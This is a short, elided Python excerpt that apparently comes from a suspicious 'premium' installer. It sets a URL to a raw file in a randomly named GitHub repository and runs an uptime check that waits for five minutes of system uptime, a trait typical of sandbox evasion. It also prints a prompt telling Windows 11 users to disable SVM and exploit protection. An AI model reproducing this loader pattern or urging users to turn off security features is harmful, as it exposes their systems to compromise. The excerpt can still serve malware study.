...
url = "https://raw.githubusercontent.com/xlxkckxlz123kxzcx/installer/refs/heads/main/uniqueid_3.0.txt"
...
def check_uptime():
    ...
    if uptime >= timedelta(minutes=5):
        ...
        while time_remaining.total_seconds() > 0:
            ...
            print("---For Windows 11 users, disable SVM in bios and disable exploit protection in order for premium to work.")
            print("/////////////////////////////////////////////////////////////////////////////////////////////")
